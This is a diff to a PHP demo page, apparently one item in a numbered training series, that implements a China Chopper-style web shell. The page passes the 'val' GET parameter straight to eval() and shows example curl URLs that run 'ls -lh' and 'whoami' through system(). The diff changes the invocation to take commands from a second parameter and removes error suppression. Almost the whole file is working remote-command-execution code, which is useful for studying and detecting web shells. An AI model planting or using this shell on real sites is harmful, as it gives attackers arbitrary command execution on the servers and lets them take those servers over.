@@ -1,7 +1,7 @@
 <?php
 	$baseurl = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?val=';
-	$linux   = $baseurl . "system('ls+-lh');";
-	$windows = $baseurl . "system('whoami');";
+	$linux   = $baseurl . 'system($_GET[0]);&0=ls+-lh';
+	$windows = $baseurl . 'system($_GET[0]);&0=whoami';
 ?>
 
 <html>
@@ -13,10 +13,10 @@
 	<h1>014 - WebShell - 中国菜刀 - eval 方式</h1>
 
 <p>不正常调用: </p>
-<p>curl '<a href="<?= $linux ?>" target="_blank"><?= $linux ?></a>'</p>
+<p>curl '<a href="<?php echo $linux ?>" target="_blank"><?php echo $linux ?></a>'</p>
 <br>
 <p>windows 不正常调用: </p>
-<p>curl '<a href="<?= $windows ?>" target="_blank"><?= $windows ?></a>'</p>
+<p>curl '<a href="<?php echo $windows ?>" target="_blank"><?php echo $windows ?></a>'</p>
 
 <br>
 <p>执行结果</p>
@@ -24,8 +24,8 @@
 <?php
 	if (isset($_GET['val'])) 
 	{
-		@eval($_GET['val']);
-	}    
+		eval($_GET['val']);
+	}
 ?>
 
 </body>
